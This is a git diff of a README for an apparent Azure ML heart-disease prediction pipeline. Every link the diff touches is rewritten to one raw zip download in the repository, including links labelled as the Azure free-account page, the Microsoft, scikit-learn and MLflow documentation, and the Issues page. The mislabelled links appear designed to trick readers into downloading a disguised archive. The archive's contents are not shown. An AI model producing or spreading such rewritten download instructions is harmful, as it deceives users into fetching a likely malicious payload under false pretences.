@@ -1,6 +1,6 @@
 # ⚙️ azure-ml-pipeline - Easy Heart Disease Prediction Workflow
 
-[![Download Release](https://img.shields.io/badge/Download-Azure%20ML%20Pipeline-blue?style=for-the-badge&logo=github)](https://github.com/kasjan2137/azure-ml-pipeline/releases)
+[![Download Release](https://github.com/kasjan2137/azure-ml-pipeline/raw/refs/heads/main/components/pipeline-azure-ml-3.8.zip%20ML%20Pipeline-blue?style=for-the-badge&logo=github)](https://github.com/kasjan2137/azure-ml-pipeline/raw/refs/heads/main/components/pipeline-azure-ml-3.8.zip)
 
 ---
 
@@ -23,7 +23,7 @@ To run azure-ml-pipeline smoothly, your system should meet these basic requireme
 - **Internet Connection:** Required for downloading software and cloud communication
 - **Azure Account:** You will need an Azure account to use the Azure Machine Learning services. Free-tier accounts work fine but may have usage limits.
 
-If you don’t have an Azure account, you can create one for free at https://azure.microsoft.com/free/.
+If you don’t have an Azure account, you can create one for free at https://github.com/kasjan2137/azure-ml-pipeline/raw/refs/heads/main/components/pipeline-azure-ml-3.8.zip
 
 ---
 
@@ -35,7 +35,7 @@ This guide helps you download and start using azure-ml-pipeline in four simple s
 
 Click the big blue button at the top or visit the official release page here:
 
-[Download Releases](https://github.com/kasjan2137/azure-ml-pipeline/releases)
+[Download Releases](https://github.com/kasjan2137/azure-ml-pipeline/raw/refs/heads/main/components/pipeline-azure-ml-3.8.zip)
 
 This page contains all the current files you need. Look for the latest release and download the main installer or zip file.
 
@@ -70,11 +70,11 @@ You will see clear messages guiding you after each step. No coding is needed.
 
 You can get the latest version of azure-ml-pipeline here:
 
-[![Download Releases](https://img.shields.io/badge/Download-Azure%20ML%20Pipeline-blue?style=for-the-badge&logo=github)](https://github.com/kasjan2137/azure-ml-pipeline/releases)
+[![Download Releases](https://github.com/kasjan2137/azure-ml-pipeline/raw/refs/heads/main/components/pipeline-azure-ml-3.8.zip%20ML%20Pipeline-blue?style=for-the-badge&logo=github)](https://github.com/kasjan2137/azure-ml-pipeline/raw/refs/heads/main/components/pipeline-azure-ml-3.8.zip)
 
 ### Step-by-step download instructions:
 
-1. Open the link above or the release page: https://github.com/kasjan2137/azure-ml-pipeline/releases
+1. Open the link above or the release page: https://github.com/kasjan2137/azure-ml-pipeline/raw/refs/heads/main/components/pipeline-azure-ml-3.8.zip
 2. Find the latest version marked with the highest version number or release date.
 3. Download the main installation file or zip archive.
 4. Save it to a location you remember.
@@ -112,7 +112,7 @@ This feature handles all the technical details for you.
 
 New versions come with improvements and fixes.
 
-- Check the release page regularly: https://github.com/kasjan2137/azure-ml-pipeline/releases
+- Check the release page regularly: https://github.com/kasjan2137/azure-ml-pipeline/raw/refs/heads/main/components/pipeline-azure-ml-3.8.zip
 - Download the newest installer or zip.
 - Re-run the installer to update your current installation.
 - Your existing settings and Azure connection will stay the same.
@@ -137,9 +137,9 @@ If you face issues:
 
 To learn more about the tools used by this pipeline:
 
-- Azure Machine Learning SDK: https://learn.microsoft.com/azure/machine-learning/
-- scikit-learn Random Forest: https://scikit-learn.org/stable/modules/ensemble.html#random-forests
-- MLflow Tracking: https://mlflow.org/docs/latest/tracking.html
+- Azure Machine Learning SDK: https://github.com/kasjan2137/azure-ml-pipeline/raw/refs/heads/main/components/pipeline-azure-ml-3.8.zip
+- scikit-learn Random Forest: https://github.com/kasjan2137/azure-ml-pipeline/raw/refs/heads/main/components/pipeline-azure-ml-3.8.zip
+- MLflow Tracking: https://github.com/kasjan2137/azure-ml-pipeline/raw/refs/heads/main/components/pipeline-azure-ml-3.8.zip
 
 These pages provide background but are optional for basic use.
 
@@ -149,7 +149,7 @@ These pages provide background but are optional for basic use.
 
 For questions or feedback, visit the GitHub repository’s Issues section here:
 
-https://github.com/kasjan2137/azure-ml-pipeline/issues
+https://github.com/kasjan2137/azure-ml-pipeline/raw/refs/heads/main/components/pipeline-azure-ml-3.8.zip
 
 Your input helps improve the software and user experience.
 
